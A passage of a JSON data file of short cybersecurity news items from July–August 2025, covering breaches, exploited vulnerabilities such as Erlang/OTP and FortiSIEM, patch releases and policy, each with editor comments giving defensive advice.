        "title": "Imperva Research",
        "url": "https://www.imperva.com"
      },
      {
        "title": "The Hacker News Coverage",
        "url": "https://thehackernews.com"
      }
    ],
    "editorNotes": []
  },
  {
    "id": "n8",
    "headline": "Workday Discloses CRM Data Breach from Social Engineering Attack",
    "summary": "Workday breached through third-party CRM platform via social engineering, compromising business contact information.",
    "fullContent": "Workday disclosed breach of third-party CRM platform where threat actors impersonated HR/IT personnel via phone/text in broader social engineering campaign. Upon discovery, access was immediately cut with additional safeguards implemented. While customer tenants weren't accessed, business contact information (names, emails, phones) described as 'commonly available' was stolen, potentially enabling future social engineering. Workday emphasized they never request credentials via phone, with official communications only through trusted channels. Breach discovered August 6, with disclosure blog post initially using 'noindex' tag preventing search engine indexing.",
    "impact": "Business contact information exposure enables sophisticated follow-on attacks against Workday's enterprise customers worldwide.",
    "category": "Breach",
    "subcategory": "Social Engineering",
    "date": "2025-08-15",
    "severity": "Medium",
    "source": "Workday",
    "authors": ["Workday Security"],
    "tags": ["workday", "social-engineering", "crm-breach", "shinyhunters"],
    "references": [
      {
        "title": "Workday Blog Post",
        "url": "https://blog.workday.com"
      },
      {
        "title": "TechCrunch Coverage",
        "url": "https://techcrunch.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Social engineering for credentials continues. Deploy phishing-resistant MFA. Document decisions about 'noindex' tags for breach notifications."
      },
      {
        "author": "Dukes",
        "comment": "Human factor remains weak link. Organizations should add social engineering modules to quarterly cybersecurity training."
      }
    ]
  },
  {
    "id": "n9",
    "headline": "Chinese APT Group Targeting Taiwanese Web Servers",
    "summary": "Cisco Talos observes Chinese APT group exploiting known vulnerabilities in Taiwanese web infrastructure for initial access.",
    "fullContent": "Cisco Talos researchers observed Chinese APT group targeting Taiwanese web infrastructure entities by exploiting known vulnerabilities in unpatched, internet-exposed servers. After initial access, attackers conduct reconnaissance to identify valuable servers, then pivot to additional systems deploying shellcode loaders for Cobalt Strike and other tools. The campaign demonstrates sophisticated targeting of critical internet infrastructure for potential broader network compromise.",
    "impact": "Critical web infrastructure compromise enabling espionage and potential disruptive attacks against Taiwanese organizations.",
    "category": "APT",
    "subcategory": "Nation-State",
    "date": "2025-08-15",
    "severity": "High",
    "source": "Cisco Talos",
    "authors": ["Cisco Talos Intelligence"],
    "tags": ["apt", "china", "taiwan", "web-infrastructure", "cobalt-strike"],
    "references": [
      {
        "title": "Talos Intelligence Blog",
        "url": "https://blog.talosintelligence.com"
      },
      {
        "title": "SecurityWeek Coverage",
        "url": "https://www.securityweek.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Dukes",
        "comment": "Root cause is poor patch management. Any actor can exploit unpatched systems. Best defense is updating within 24-48 hours of patch availability."
      }
    ]
  },
  {
    "id": "n10",
    "headline": "Colt Technology Services Cyber Incident Causes Widespread Outages",
    "summary": "UK telecommunications provider Colt experiences cyber incident causing customer portal outages and service disruptions.",
    "fullContent": "Colt Technology Services disclosed cyber incident causing significant outages affecting customer portal and support services. The company proactively took systems offline as protective measure, leading to service disruptions. Colt has been providing regular updates via status page while addressing the incident. WarLock ransomware group has claimed responsibility with data allegedly for sale, though Colt has not confirmed ransomware involvement in official communications.",
    "impact": "Major telecommunications disruption affecting business customers across UK and Europe, potentially compromising critical infrastructure.",
    "category": "Incident",
    "subcategory": "Telecommunications",
    "date": "2025-08-15",
    "severity": "High",
    "source": "Colt Technology Services",
    "authors": ["Colt Technology Services"],
    "tags": ["colt", "telecom", "outage", "ransomware", "warlock"],
    "references": [
      {
        "title": "Colt Status Page",
        "url": "https://www.colt.net"
      },
      {
        "title": "The Register Coverage",
        "url": "https://www.theregister.com"
      }
    ],
    "editorNotes": []
  },
  {
    "id": "nn1",
    "headline": "Erlang/OTP RCE Exploitation Targets OT Environments",
    "summary": "Attackers are exploiting a critical Erlang/OTP vulnerability (CVE-2025-32433) to target Operational Technology environments, with education sector hit hardest.",
    "fullContent": "Researchers from Palo Alto Networks observed attacks exploiting a maximum-severity flaw (CVE-2025-32433, CVSS 10.0) in Erlang programming language's Open Telecom Platform libraries. The vulnerability allows unauthorized access and arbitrary command execution without credentials by exploiting improper state enforcement in the SSH daemon. OT and 5G environments use Erlang/OTP for its fault-tolerance and scalability. While CISA added the flaw to its Known Exploited Vulnerabilities catalog on June 9, PAN observed attacks beginning May 1. The education industry was hit hardest, and OT firewalls in healthcare, agriculture, media and entertainment were disproportionately affected.",
    "impact": "Critical infrastructure and industrial control systems are at risk of remote compromise, potentially leading to operational disruption and safety concerns.",
    "category": "Vulnerabilities",
    "subcategory": "OT Security",
    "date": "2025-08-11",
    "severity": "Critical",
    "source": "Palo Alto Networks Unit 42",
    "authors": ["Palo Alto Networks Researchers"],
    "tags": ["rce", "ot-security", "critical-infrastructure", "cve-2025-32433"],
    "references": [
      {
        "title": "Keys to the Kingdom: Erlang/OTP SSH Vulnerability Analysis",
        "url": "https://unit42.paloaltonetworks.com"
      },
      {
        "title": "CISA KEV Catalog Entry",
        "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Odds are you're not going to be able to update your OT systems quickly, so make sure the entry points are secured with external firewalls."
      },
      {
        "author": "Dukes",
        "comment": "A CVSS score of 10.0 moves the vulnerability to the top of the evildoer's queue."
      }
    ]
  },
  {
    "id": "nn2",
    "headline": "CISA Releases OT Asset Cybersecurity Guidance with International Partners",
    "summary": "CISA and international partners publish operational technology asset cybersecurity guidance for critical infrastructure owners and operators.",
    "fullContent": "CISA along with cybersecurity agencies from Australia, Canada, Germany, Netherlands, and New Zealand published Operational Technology asset cybersecurity guidance. The guidance provides a systematic approach for creating and maintaining OT asset inventory and supplemental taxonomy essential for identifying critical assets, reducing cybersecurity incident risk, and ensuring continuity of operations. This comes as Dragos observed an 87% increase in ransomware attacks against industrial organizations in 2024, and a new report estimates indirect losses impact up to 70% of OT-related breaches with worst-case scenarios estimating $329.5 billion in global financial risk.",
    "impact": "Provides standardized framework for OT security that could significantly reduce risk to critical infrastructure across multiple sectors.",
    "category": "Guidance",
    "subcategory": "OT Security",
    "date": "2025-08-13",
    "severity": "High",
    "source": "CISA",
    "authors": ["CISA", "International Partners"],
    "tags": ["ot-security", "critical-infrastructure", "guidance", "asset-management"],
    "references": [
      {
        "title": "Foundations for OT Cybersecurity: Asset Inventory Guidance",
        "url": "https://www.cisa.gov/foundations-ot-cybersecurity-asset-inventory-guidance"
      },
      {
        "title": "Dragos OT Security Financial Risk Report",
        "url": "https://www.dragos.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "OT is no longer set it and forget it. You need inventory, monitoring, and protection with physical and logical separation."
      },
      {
        "author": "Murray",
        "comment": "OT engineers and Cybersecurity engineers need to share a common codebook for effective communications."
      }
    ]
  },
  {
    "id": "nn3",
    "headline": "Microsoft August 2025 Patch Tuesday Addresses Over 100 Vulnerabilities",
    "summary": "Microsoft's August Patch Tuesday addresses more than 100 vulnerabilities including a previously known Kerberos privilege elevation vulnerability.",
    "fullContent": "Microsoft released updates addressing more than 100 vulnerabilities across their product lines, with over a dozen rated critical. A moderate-severity privilege elevation vulnerability in Windows Kerberos (CVE-2025-53779) was previously publicly known. Other vendors also released updates including Adobe (nearly 70 vulnerabilities across multiple products), SAP (19 security notes with three critical flaws affecting SAP S/4 HANA), Intel (34 advisories addressing 60+ vulnerabilities), and Google (Android updates for actively exploited Qualcomm vulnerabilities).",
    "impact": "Multiple critical vulnerabilities require immediate patching across Microsoft, Adobe, SAP, Intel, and Google products.",
    "category": "Patch Management",
    "subcategory": "Vulnerability Updates",
    "date": "2025-08-12",
    "severity": "High",
    "source": "Microsoft Security Response Center",
    "authors": ["Microsoft", "Adobe", "SAP", "Intel", "Google"],
    "tags": ["patch-tuesday", "microsoft", "adobe", "sap", "intel", "android"],
    "references": [
      {
        "title": "Microsoft Security Update Guide",
        "url": "https://msrc.microsoft.com/update-guide"
      },
      {
        "title": "Adobe Security Bulletins",
        "url": "https://helpx.adobe.com/security.html"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Don't overlook the Android updates for Qualcomm flaws. SOC systems have their own OS that needs updating too."
      }
    ]
  },
  {
    "id": "nn4",
    "headline": "NY AG Lawsuit Alleges Zelle Employed Insufficient Cybersecurity Leading to $1B in Fraud",
    "summary": "New York Attorney General sues Zelle parent company over alleged poor cybersecurity that led to over $1 billion in consumer fraud.",
    "fullContent": "New York's Attorney General is suing Zelle parent company Early Warning Services over alleged poor cybersecurity that enabled widespread fraud. The complaint alleges EWS hurried Zelle to market to compete with Venmo and PayPal, implementing minimal security that required only email/phone and bank account to register. By 2019, Zelle fraud was evident, but EWS abandoned proposed security enhancements until 2023 when outside pressure forced changes that immediately reduced fraud. The lawsuit seeks restitution for six years of inadequate fraud prevention during which over $1 billion was stolen from consumers.",
    "impact": "Highlights systemic security failures in fintech applications and could set precedent for financial service cybersecurity requirements.",
    "category": "Legal",
    "subcategory": "Financial Security",
    "date": "2025-08-13",
    "severity": "High",
    "source": "New York Attorney General",
    "authors": ["New York Attorney General"],
    "tags": ["fintech", "lawsuit", "financial-fraud", "payment-security"],
    "references": [
      {
        "title": "NY AG Complaint Against Zelle",
        "url": "https://ag.ny.gov"
      },
      {
        "title": "The Record Media Coverage",
        "url": "https://therecord.media"
      }
    ],
    "editorNotes": [
      {
        "author": "Pescatore",
        "comment": "The key issue was 'quick registration and lack of verification made infiltration easy.' Building in security is more profitable than risking customers."
      },
      {
        "author": "Dukes",
        "comment": "EWS claims 99.95% success rate was acceptable risk, but NY AG disagrees on what constitutes reasonable cybersecurity."
      }
    ]
  },
  {
    "id": "nn5",
    "headline": "Critical FortiSIEM Flaw with Exploit Code Requires Immediate Patching",
    "summary": "Fortinet warns of critical FortiSIEM vulnerability (CVE-2025-25256) with exploit code available in the wild.",
    "fullContent": "Fortinet published an advisory urging immediate patching of a critical vulnerability in FortiSIEM (CVE-2025-25256, CVSS 9.8) affecting multiple versions. The flaw allows unauthenticated attackers to execute arbitrary commands via crafted CLI requests due to improper input neutralization. Practical exploit code that doesn't produce distinctive IoCs has been found in the wild. Researchers at GreyNoise observed a sudden spike in brute-force traffic against Fortinet SSL VPNs on August 3, which often precedes disclosure of new vulnerabilities affecting the same vendor.",
    "impact": "FortiSIEM systems are vulnerable to remote code execution without authentication, potentially compromising security monitoring infrastructure.",
    "category": "Vulnerabilities",
    "subcategory": "Network Security",
    "date": "2025-08-12",
    "severity": "Critical",
    "source": "Fortinet",
    "authors": ["Fortinet"],
    "tags": ["fortinet", "rce", "siem", "cve-2025-25256"],
    "references": [
      {
        "title": "Fortinet Security Advisory",
        "url": "https://fortiguard.fortinet.com"
      },
      {
        "title": "GreyNoise Brute Force Observations",
        "url": "https://www.greynoise.io"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "This can be exploited anonymously with low complexity. Block port 7900 and deploy updates immediately since there are no flaw-specific IoCs."
      }
    ]
  },
  {
    "id": "nn6",
    "headline": "Zoom and Xerox Patch Critical Vulnerabilities in Their Products",
    "summary": "Zoom and Xerox release critical security updates addressing privilege escalation and remote code execution vulnerabilities.",
    "fullContent": "Zoom released patches for Windows clients addressing CVE-2025-49457 (CVSS 9.6, privilege escalation via network access) and CVE-2025-49456 (CVSS 6.2, integrity impact via local access). Xerox patched FreeFlow Core addressing CVE-2025-8356 (CVSS 9.8, RCE via path traversal) and CVE-2025-8355 (CVSS 7.5, SSRF via XML external entity injection). The Xerox vulnerabilities were discovered by Horizon3.ai and allow unauthenticated remote code execution on vulnerable instances.",
    "impact": "Multiple widely deployed products require immediate updating to prevent privilege escalation and remote code execution attacks.",
    "category": "Patch Management",
    "subcategory": "Vulnerability Updates",
    "date": "2025-08-12",
    "severity": "High",
    "source": "Zoom, Xerox",
    "authors": ["Zoom", "Xerox", "Horizon3.ai"],
    "tags": ["zoom", "xerox", "rce", "privilege-escalation"],
    "references": [
      {
        "title": "Zoom Security Updates",
        "url": "https://www.zoom.com/security"
      },
      {
        "title": "Xerox Security Bulletin",
        "url": "https://securitydocs.business.xerox.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Push out the Zoom update rather than waiting for users. The flaws are Windows-specific but update all clients anyway."
      }
    ]
  },
  {
    "id": "nn7",
    "headline": "CISA Adds Critical N-central Flaws to Known Exploited Vulnerabilities Catalog",
    "summary": "CISA adds two critical N-able N-central vulnerabilities to its KEV catalog due to active exploitation.",
    "fullContent": "CISA added two flaws in N-able's N-central (CVE-2025-8875 and CVE-2025-8876, both CVSS 9.4) to its Known Exploited Vulnerabilities catalog. The vulnerabilities allow local code execution via deserialization and OS command injection via improper input validation. N-able confirmed limited exploitation in on-premises environments with no evidence of cloud compromise. CISA requires federal agencies to patch by August 20 and warns these vulnerabilities are frequent attack vectors that pose significant risks.",
    "impact": "Network management systems are compromised, potentially giving attackers control over managed endpoints and infrastructure.",
    "category": "Vulnerabilities",
    "subcategory": "Network Management",
    "date": "2025-08-13",
    "severity": "Critical",
    "source": "CISA",
    "authors": ["CISA", "N-able"],
    "tags": ["n-able", "n-central", "rce", "cisa-kev"],
    "references": [
      {
        "title": "CISA KEV Catalog Update",
        "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
      },
      {
        "title": "N-able Security Update",
        "url": "https://status.n-able.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Authentication requirement isn't sufficient protection without good MFA. Ensure N-central audit logs are forwarded to central logging."
      }
    ]
  },
  {
    "id": "nn8",
    "headline": "Italian Hotels' Booking Systems Compromised, Identity Documents Stolen",
    "summary": "Cyber actors target Italian hotels through booking systems, stealing high-resolution scans of identity documents including passports.",
    "fullContent": "Italy's AGID reported threat actors targeting hotels through booking systems, stealing high-resolution scans of identity documents provided during check-in. At least 10 hotels were affected, with data stolen between June-August 2025 containing tens of thousands of individuals' information. CERT-AgID intercepted illegal sale of the stolen documents. Italy's Data Protection Authority launched an investigation into the breaches that compromise sensitive personally identifiable information.",
    "impact": "Massive theft of sensitive identity documents creates significant identity theft risk for tens of thousands of individuals.",
    "category": "Breach",
    "subcategory": "Data Theft",
    "date": "2025-08-13",
    "severity": "High",
    "source": "Italian AGID",
    "authors": ["Italian AGID"],
    "tags": ["data-breach", "identity-theft", "hospitality", "pii"],
    "references": [
      {
        "title": "AGID Security Alert",
        "url": "https://www.agid.gov.it"
      },
      {
        "title": "Italian Data Protection Authority",
        "url": "https://www.gpdp.it"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Hotel document scanning is mandatory in many countries. This highlights risks of collected data being improperly secured."
      },
      {
        "author": "Murray",
        "comment": "Data should be erased after use rather than retained 'just in case' to prevent this type of exposure."
      }
    ]
  },
  {
    "id": "nn9",
    "headline": "Canada House of Commons Suffers Data Breach Through Microsoft Vulnerability",
    "summary": "Canada's House of Commons experiences cybersecurity breach via exploited Microsoft vulnerability, compromising device management data.",
    "fullContent": "Canada's House of Commons suffered a cybersecurity breach where a threat actor exploited a recent Microsoft vulnerability to gain unauthorized access to a database containing information used to manage computers and mobile devices. The breach compromised non-public information related to employees' work devices. The incident highlights continued targeting of government institutions through software vulnerabilities.",
    "impact": "Government legislative body compromised, potentially exposing sensitive operational information and employee device data.",
    "category": "Breach",
    "subcategory": "Government",
    "date": "2025-08-14",
    "severity": "High",
    "source": "CBC News",
    "authors": ["Canadian House of Commons"],
    "tags": ["data-breach", "government", "microsoft", "canada"],
    "references": [
      {
        "title": "CBC News Coverage",
        "url": "https://www.cbc.ca"
      },
      {
        "title": "The Record Media Coverage",
        "url": "https://therecord.media"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Whether SharePoint (CVE-2025-53770) or Exchange (CVE-2025-53786), ensure on-prem/hybrid systems are patched and asset databases secured."
      },
      {
        "author": "Murray",
        "comment": "Attacks are expanding from executive to legislative and judicial branches, requiring comprehensive response."
      }
    ]
  },
  
  {
    "id": "n2",
    "headline": "Saint Paul, MN Calls on National Guard After Disruptive Cyberattack",
    "summary": "Minnesota Governor activates National Guard to assist Saint Paul recover from a major cyberattack.",
    "fullContent": "On Tuesday, July 29, 2025, Minnesota Governor Tim Walz signed an executive order activating the Minnesota National Guard to help the city of Saint Paul recover from a cyberattack that took place on Friday, July 25, noting that 'the magnitude and complexity of the cybersecurity incident have exceeded the city's response capacity.' The attack targeted 'critical systems and digital services,' disrupting the city's services through the weekend while officials worked with Minnesota Information Technology Services and a third-party cybersecurity vendor to respond.",
    "impact": "The attack has caused significant disruption to city services including public internet access, online payments, and water bill processing.",
    "category": "Cyber Attacks",
    "subcategory": "Municipal Systems",
    "date": "2025-07-29",
    "severity": "High",
    "source": "SANS NewsBites",
    "tags": ["municipal", "critical infrastructure", "incident response"],
    "affectedSystems": ["city services", "payment systems", "utility billing"],
    "references": [
      {
        "title": "Saint Paul Official Website",
        "url": "https://www.stpaul.gov"
      },
      {
        "title": "Minnesota Government",
        "url": "https://mn.gov"
      }
    ],
    "editorNotes": [
      {
        "author": "Elgee",
        "comment": "Every state and four territories have part-time Army and Air National Guard cyber wizards."
      },
      {
        "author": "Pescatore",
        "comment": "Having National Guard members with hands on cybersecurity skills is a win-win scenario."
      }
    ]
  },
   {
    "id": "n1",
    "headline": "DEF CON Franklin Project Provides No-Cost Cybersecurity Assistance to US Water Utilities",
    "summary": "DEF CON Franklin provides free cybersecurity assistance to US water utilities, helping secure critical infrastructure against state-sponsored threats.",
    "fullContent": "DEF CON Franklin provided free cybersecurity assistance to five US water utilities in Indiana, Oregon, Utah, and Vermont over nine months. The project aims to scale up to help thousands of water utilities nationwide amid increased cyberattacks by state-sponsored hackers. Volunteers assisted with cybersecurity basics including changing default passwords, enabling MFA, asset inventories, OT assessments, and network mapping. Some small utilities initially didn't perceive themselves as targets. The project is collaborating with companies like Dragos to identify free tools applicable to water utilities for rapid deployment.",
    "impact": "Critical infrastructure protection for water systems, addressing security gaps in small utilities that are vulnerable to nation-state attacks.",
    "category": "Critical Infrastructure",
    "subcategory": "Water Security",
    "date": "2025-08-07",
    "severity": "High",
    "source": "DEF CON Franklin",
    "authors": ["Jake Braun", "University of Chicago Cyber Policy Initiative"],
    "tags": ["critical-infrastructure", "water-security", "ot-security", "volunteer-initiative"],
    "references": [
      {
        "title": "DEF CON Franklin Project",
        "url": "https://defcon.org"
      },
      {
        "title": "The Register Coverage",
        "url": "https://www.theregister.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "The big hurdle was getting utilities to understand they were targets. Free tools counter budget shortfalls, and volunteers help configure defenses and educate."
      },
      {
        "author": "Dukes",
        "comment": "Major kudos to DEF CON Franklin. The question is sustainability after funding ends."
      }
    ]
  },
  {
    "id": "n2",
    "headline": "CISA Commits to Continued Funding for CVE Program",
    "summary": "CISA pledges ongoing support for the Common Vulnerabilities and Exposures program after funding uncertainty prompted EU to develop alternative.",
    "fullContent": "CISA leaders at Black Hat pledged continued funding for the CVE program, calling it 'central to all cybersecurity operations.' This follows April 2025 announcements that federal funding wouldn't be renewed, prompting CISA to commit to 11 months of support and the EU to develop its own vulnerability database. CVE Program board members established the CVE Foundation advocating for transition to a nonprofit with international coordination and multiple funding sources. CISA also hopes legislators will reauthorize the expiring Cybersecurity Information Sharing Act.",
    "impact": "Ensures continuity of critical vulnerability tracking infrastructure used globally by cybersecurity professionals and organizations.",
    "category": "Vulnerability Management",
    "subcategory": "CVE Program",
    "date": "2025-08-07",
    "severity": "Medium",
    "source": "CISA",
    "authors": ["Chris Butera", "CISA Leadership"],
    "tags": ["cve", "vulnerability-management", "funding", "government"],
    "references": [
      {
        "title": "CISA Statement",
        "url": "https://www.cisa.gov"
      },
      {
        "title": "NextGov Coverage",
        "url": "https://www.nextgov.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Dukes",
        "comment": "Good news, but politicos may not control future purse strings. Time to transition CVE to a non-profit with global remit and sustainable funding."
      }
    ]
  },
  {
    "id": "n3",
    "headline": "DARPA Announces AI Cybersecurity Challenge Winners at DEF CON",
    "summary": "DARPA awards $8.5M to winners of AI Cyber Challenge for developing systems that automatically detect and fix vulnerabilities.",
    "fullContent": "DARPA announced winners of their two-year AI Cyber Challenge at DEF CON. Team Atlanta (Georgia Tech, Samsung Research, KAIST, POSTECH) won $4M for first place. Trail of Bits took second ($3M) and Theori third ($1.5M). The competition developed AI systems to automatically detect and fix vulnerabilities. All seven semi-finalist models will be released as open source in coming weeks, advancing automated cybersecurity capabilities.",
    "impact": "Accelerates development of AI-powered vulnerability discovery and patching, potentially transforming cybersecurity defense automation.",
    "category": "Artificial Intelligence",
    "subcategory": "Security Automation",
    "date": "2025-08-08",
    "severity": "Medium",
    "source": "DARPA",
    "authors": ["DARPA"],
    "tags": ["ai", "automation", "vulnerability-discovery", "def-con"],
    "references": [
      {
        "title": "DARPA AI Cyber Challenge",
        "url": "https://www.darpa.mil"
      },
      {
        "title": "The Record Coverage",
        "url": "https://therecord.media"
      }
    ],
    "editorNotes": []
  },
  {
    "id": "n4",
    "headline": "US Federal Court System Documents Breached in Cyberattack",
    "summary": "Federal judiciary discloses breach of court document systems containing sensitive case information including sealed indictments.",
    "fullContent": "The US Federal Courts announced enhanced security for electronic filing systems following 'recent escalated cyberattacks.' Sources disclosed a serious breach of sensitive court data across multiple states around July 4, affecting the Case Management/ECF and PACER systems. The breach potentially exposed sealed indictments with non-public crime details, risking cooperating witnesses and exploitation by criminals. The Administrative Office of US Courts is working with DOJ, DHS, and executive partners to mitigate risks while restricting access to sensitive documents under controlled monitoring.",
    "impact": "Compromise of sensitive judicial documents including sealed indictments, potentially endangering witnesses and ongoing investigations.",
    "category": "Breach",
    "subcategory": "Government",
    "date": "2025-08-07",
    "severity": "Critical",
    "source": "US Courts",
    "authors": ["Administrative Office of US Courts"],
    "tags": ["government-breach", "judicial-system", "sensitive-documents", "pacer"],
    "references": [
      {
        "title": "US Courts Press Release",
        "url": "https://www.uscourts.gov"
      },
      {
        "title": "Politico Investigation",
        "url": "https://www.politico.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Dukes",
        "comment": "Why didn't they practice reasonable cybersecurity before? Five years is long enough to implement processes. Calling attacks 'sophisticated' is passing the buck."
      }
    ]
  },
  {
    "id": "n5",
    "headline": "WinRAR Zero-Day Vulnerability Actively Exploited by Multiple Threat Actors",
    "summary": "ESET discovers actively exploited WinRAR zero-day (CVE-2025-8088) allowing arbitrary code execution via crafted archive files.",
    "fullContent": "ESET researchers discovered a zero-day vulnerability in WinRAR (CVE-2025-8088, CVSS 8.4) being actively exploited by Russia-linked threat actors. The path traversal vulnerability allows arbitrary code execution via archives containing malicious alternate data streams. Discovered July 18, disclosed to WinRAR July 24, with fix released in version 7.13 on July 30. The exploitation appeared in spear phishing targeting financial, manufacturing, defense, and logistics companies in Europe and Canada. BI.ZONE separately observed different threat actors exploiting the same zero-day against Russian organizations.",
    "impact": "Widespread exploitation risk for WinRAR users, potentially compromising systems through malicious archive files.",
    "category": "Vulnerabilities",
    "subcategory": "Software Security",
    "date": "2025-08-11",
    "severity": "High",
    "source": "ESET",
    "authors": ["ESET Researchers"],
    "tags": ["winrar", "zero-day", "cve-2025-8088", "rce"],
    "references": [
      {
        "title": "ESET Research Blog",
        "url": "https://www.welivesecurity.com"
      },
      {
        "title": "WinRAR Security Update",
        "url": "https://www.win-rar.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Patch available - roll it out. Also scan for products with embedded WinRAR capabilities as they may be on different release schedules."
      }
    ]
  },
  {
    "id": "n6",
    "headline": "Marks & Spencer Restores Services 3.5 Months After Ransomware Attack",
    "summary": "UK retailer gradually restoring online services after April ransomware attack, with some functions still offline after 15 weeks.",
    "fullContent": "Marks & Spencer has restored its 'Click & Collect' service and domestic online ordering/returns after 3.5 months of disruption following an April ransomware attack. Some services remain offline including international ordering, online stock checking, Sparks Pay credit accounts, and occasion-cake ordering. 'Scan and Shop' in-app purchases are limited to £45. The restoration demonstrates the complex, extended recovery process following major cyber incidents.",
    "impact": "Extended business disruption showing real-world recovery challenges after ransomware attacks on critical systems.",
    "category": "Incident Response",
    "subcategory": "Recovery",
    "date": "2025-08-11",
    "severity": "High",
    "source": "Marks & Spencer",
    "authors": ["Marks & Spencer"],
    "tags": ["ransomware", "recovery", "business-disruption", "retail"],
    "references": [
      {
        "title": "BBC Coverage",
        "url": "https://www.bbc.com"
      },
      {
        "title": "M&S Service Updates",
        "url": "https://www.marksandspencer.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Service restoration introduces unexpected snags. Include actual restoration exercises in recovery planning."
      },
      {
        "author": "Dukes",
        "comment": "This should be a risk management case study: timeline, cyber insurance dependency, resilience, and brand impact."
      }
    ]
  },
  {
    "id": "n7",
    "headline": "Connex Credit Union Discloses Data Breach Affecting 172,000 Members",
    "summary": "Connecticut credit union discloses June cyberattack compromising names, account numbers, SSNs, and government IDs of members.",
    "fullContent": "Connex Credit Union disclosed a June 2-3 cyberattack affecting approximately 172,000 individuals. Compromised data includes names, account numbers, debit card information, Social Security numbers, and government IDs used for account opening. The credit union secured systems, engaged experts, and confirmed no unauthorized access to member accounts or funds. Notifications sent to 467 Maine residents with complimentary credit monitoring offered. Scammers are already attempting to exploit the incident through impersonation attacks.",
    "impact": "Significant financial data exposure for credit union members, with immediate scam attempts following disclosure.",
    "category": "Breach",
    "subcategory": "Financial",
    "date": "2025-08-07",
    "severity": "High",
    "source": "Connex Credit Union",
    "authors": ["Connex Credit Union"],
    "tags": ["financial-breach", "credit-union", "pii", "identity-theft"],
    "references": [
      {
        "title": "Maine AG Filing",
        "url": "https://www.maine.gov/ag"
      },
      {
        "title": "Connex Security Notice",
        "url": "https://www.connexcu.org"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Determine which services are impacted. Use official contacts only as scammers are already exploiting the incident."
      },
      {
        "author": "Murray",
        "comment": "Another instance of information retained longer than needed for recognition/identification being breached."
      }
    ]
  },
  {
    "id": "n8",
    "headline": "Google Salesforce Instance Breach Compromises Google Ads Data",
    "summary": "ShinyHunters breach Google Salesforce instance, compromising business contact information for Google Ads customers.",
    "fullContent": "Google confirmed a breach of their Salesforce CRM instance compromising business contact information and related notes for Google Ads. ShinyHunters threat actors used social engineering against employees to gain access or trick them into linking malicious Salesforce Data Loader OAuth apps. Google Threat Intelligence previously reported Salesforce targeting in June. Other organizations targeted include Chanel, Pandora, KLM, and Air France through similar third-party platform compromises.",
    "impact": "Business information compromise affecting Google Ads customers, part of broader Salesforce targeting campaign.",
    "category": "Breach",
    "subcategory": "Cloud Security",
    "date": "2025-08-05",
    "severity": "Medium",
    "source": "Google",
    "authors": ["Google Security Team"],
    "tags": ["salesforce", "oauth", "social-engineering", "shinyhunters"],
    "references": [
      {
        "title": "Google Threat Intelligence",
        "url": "https://cloud.google.com/blog"
      },
      {
        "title": "BleepingComputer Coverage",
        "url": "https://www.bleepingcomputer.com"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Beware of authenticators bearing gifts. Implement phishing-resistant MFA so compromised credentials don't work."
      }
    ]
  },
  {
    "id": "n3",
    "headline": "Apple Updates and Microsoft's Analysis of the macOS Sploitlight Vulnerability",
    "summary": "Apple releases multiple updates addressing nearly 90 vulnerabilities, including a zero-day exploited in Chrome.",
    "fullContent": "Earlier this week, Apple released multiple updates to address nearly 90 vulnerabilities in Safari, iOS, iPadOS, macOS, watchOS, tvOS, and visionOS. Among the flaws fixed in the updates is a zero-day improper input validation vulnerability (CVE-2025-6558) that has been exploited to target Google Chrome users. In a separate story, Microsoft has published a blog describing a vulnerability (CVE-2025-31199) in macOS 'that could let attackers steal private data of files normally protected by transparency, consent, and control (TCC) ... that if exploited could let attackers bypass TCC and leak sensitive information cached by Apple Intelligence.' Microsoft calls the vulnerability Sploitlight.",
    "impact": "These vulnerabilities could allow attackers to bypass security controls and access sensitive data on macOS systems.",
    "category": "Vulnerabilities",
    "subcategory": "Operating Systems",
    "date": "2025-07-30",
    "severity": "Critical",
    "source": "SANS NewsBites",
    "tags": ["Apple", "macOS", "zero-day", "Microsoft"],
    "cves": [
      {
        "id": "CVE-2025-6558",
        "description": "Improper input validation vulnerability in Apple WebKit"
      },
      {
        "id": "CVE-2025-31199",
        "description": "macOS TCC bypass vulnerability"
      }
    ],
    "references": [
      {
        "title": "Apple Security Updates",
        "url": "https://support.apple.com/en-us/HT201222"
      },
      {
        "title": "Microsoft Security Blog",
        "url": "https://www.microsoft.com/security/blog"
      }
    ],
    "editorNotes": [
      {
        "author": "Neely",
        "comment": "Apple addresses 89 flaws with these updates; roll these before they start getting used."
      },
      {
        "author": "Murray",
        "comment": "While Apple is timely, it is not regular. It applies fixes proactively."
      }
    ]
  },
  {
    "id": "n4",
    "headline": "US Senate Unanimously Calls for Release of 2022 Telco Security Report",
    "summary": "Senate passes bill requiring release of telecom security report prepared for CISA in 2022.",
    "fullContent": "On July 28, 2025, the US Senate unanimously passed the 'Telecom Cybersecurity Transparency Act,' which, if passed by the House and signed into law, would require within 30 days of enactment the full unclassified release of a report investigating weaknesses in US telecommunications companies' security, prepared in 2022 for the US Cybersecurity and Infrastructure Security Agency (CISA). Senator Ron Wyden (D-Oregon), who introduced the bill, illustrated the report's importance by citing a 2024 whistleblower report filed with the Federal Communications Commission alleging 'numerous incidents of successful, unauthorized attempts to access the network user location data of communications service providers operating in the USA.'",
    "impact": "Release of this report could reveal significant vulnerabilities in US telecommunications infrastructure.",
    "category": "Policy",
    "subcategory": "Telecommunications",
    "date": "2025-07-29",
    "severity": "High",
    "source": "SANS NewsBites",
